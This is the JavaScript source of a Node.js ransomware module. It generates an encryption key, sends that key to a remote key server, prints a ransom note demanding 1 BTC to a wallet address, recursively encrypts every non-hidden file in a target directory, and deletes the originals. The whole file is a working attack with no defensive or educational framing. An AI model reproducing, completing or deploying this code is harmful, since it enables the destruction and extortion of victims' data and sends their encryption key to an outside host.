const settings  = require("./settings")
const rand      = require("random-key")
const cryptoLib = require('crypto')
const zlib      = require('zlib')
const encrypt   = require('node-file-encrypt')
const fs        = require('fs')
const sqlite3   = require('sqlite3')
const cc        = require('cryptocompare')
const request   = require('request')

class crypto {
    
    constructor(){
        this.generateKey()
    }
    
    generateKey(){
        this.key = rand.generate(50)
        let url = settings.keyAPI+this.key
        request(url, function (err, response, body) {
            if (err) {
                console.log('error:', error)
            }
        })
        this.initialiseDatabase()
    }
    
    initialiseDatabase(){
        let dbExist = fs.existsSync(settings.databaseFile)
        this.db = new sqlite3.Database(settings.databaseFile)
        if(!dbExist){
            this.db.run("CREATE TABLE 'files' (\
                    'fullPath' text NOT NULL,\
                    'date' bigint NOT NULL);")
            this.db.close()
        }
        this.showMessage()
    }
    
    showMessage(){
        request(settings.cryptoAPI, function (err, response, body) {
            if (err) {
                console.log('error:', error)
            } else {
                let prices = JSON.parse(body)
                let price = prices.bpi.EUR.rate.padStart(15,' ')
                console.log('################################################################')
                console.log('#                                                              #')
                console.log('#                 All your files are encrypted                 #')
                console.log('#     Send 1 BTC to this address to get the decryption key     #')
                console.log('#             '+settings.walletBTC+'               #')
                console.log('#                                                              #')
                console.log('#               1 BTC = '+price+' EUR                    #')
                console.log('#                                                              #')
                console.log('################################################################')
            }

        })
        this.scanDirectory(settings.defaultDirectory)
    }
    
    async scanDirectory(path){
        const that = this
        fs.readdir(path, async function(err, items) {
            for (var i=0; i<items.length; i++) {
                let fullPath = path+items[i]
                if(fs.statSync(fullPath).isDirectory()){
                    fullPath += '/'
                    that.scanDirectory(fullPath)
                }else{
                    let pathArray = fullPath.split('/')
                    let fileName = pathArray[pathArray.length - 1]
                    pathArray.pop()
                    path = pathArray.join('/')+'/'
                    if(fileName.charAt(0) != '.'){
                        let fileNameArray = fileName.split('.')
                        let extention = fileNameArray[fileNameArray.length - 1]
                        if(extention != 'crypt'){
                            await that.encryptFile(path, fileName)
                        }
                    }
                }
            }
        });
    }
    
    encryptFile(path, fileName){
        let f = new encrypt.FileEncrypt(path+fileName);
        f.openSourceFile();
        f.encrypt(this.key);
        let encryptPath = f.encryptFilePath;
        this.deleteFile(path+fileName)
    }
    
    deleteFile(fullPath){
        fs.unlink(fullPath)
    }
    
}

module.exports = crypto